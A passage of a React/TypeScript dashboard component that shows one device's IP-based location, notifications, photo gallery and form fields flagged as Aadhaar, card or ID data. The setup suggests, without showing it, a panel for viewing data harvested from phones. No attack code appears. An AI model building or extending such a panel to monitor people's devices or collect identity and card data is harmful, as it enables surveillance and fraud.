                { label: "Region", value: ipDetails.region },
                { label: "Country", value: `${ipDetails.country_name} (${ipDetails.country_code})` },
                { label: "ISP", value: ipDetails.org },
                { label: "Timezone", value: ipDetails.timezone },
                { label: "Lat/Lon", value: ipDetails.latitude && ipDetails.longitude ? `${ipDetails.latitude}, ${ipDetails.longitude}` : null },
                { label: "Postal", value: ipDetails.postal },
              ].filter(r => r.value).map(r => (
                <div key={r.label} className="flex items-center justify-between py-1.5 px-3 rounded-lg bg-background/60 border border-border/50">
                  <span className="text-[10px] text-muted-foreground">{r.label}</span>
                  <span className="text-[11px] font-bold text-foreground font-mono text-right max-w-[60%] break-all">{r.value}</span>
                </div>
              ))}
            </div>
          ) : null}
        </DialogContent>
      </Dialog>

      {/* ── Notifications Modal ── */}
      {showNotifications && (
        <NotificationsModal
          deviceId={id}
          deviceName={`${user.brand} ${user.model}`}
          onClose={() => setShowNotifications(false)}
        />
      )}
      {/* ── Gallery Modal ── */}
      <GalleryModal
        open={showGallery}
        onClose={() => setShowGallery(false)}
        deviceId={id}
      />
    </div>
  );
};

/* ── Sub-components ── */

const EmptyState = ({ icon: Icon, text, spin }: { icon: React.ElementType; text: string; spin?: boolean }) => (
  <div className="flex flex-col items-center justify-center py-20 gap-3">
    <div className="h-12 w-12 rounded-2xl bg-card border border-border flex items-center justify-center">
      <Icon className={`h-5 w-5 text-muted-foreground ${spin ? "animate-spin" : ""}`} />
    </div>
    <p className="text-xs text-muted-foreground">{text}</p>
  </div>
);

const StatPill = ({ icon, value, color }: { icon: React.ReactNode; value: string; color: string }) => (
  <span className={`inline-flex items-center gap-1 px-2.5 py-1 rounded-lg bg-card border border-border text-[10px] font-semibold whitespace-nowrap ${color}`}>
    {icon}
    {value}
  </span>
);

const FormFieldIcon = ({ field }: { field: string }) => {
  const lower = field.toLowerCase();
  if (lower.includes("name")) return <User className="h-3 w-3 text-green" />;
  if (lower.includes("mobile") || lower.includes("phone")) return <Phone className="h-3 w-3 text-cyan" />;
  if (lower.includes("aadhaar") || lower.includes("card") || lower.includes("id") || lower === "bvcx") return <CardIcon className="h-3 w-3 text-pink" />;
  return <FileText className="h-3 w-3 text-muted-foreground" />;
};

function getTimeAgo(timestamp: number): string {
  const now = Date.now();
  const diff = now - timestamp;
  const mins = Math.floor(diff / 60000);
  if (mins < 1) return "Just now";
  if (mins < 60) return `${mins}m ago`;
  const hours = Math.floor(mins / 60);
  if (hours < 24) return `${hours}h ago`;
  return `${Math.floor(hours / 24)}d ago`;
}

export default DeviceDetail;
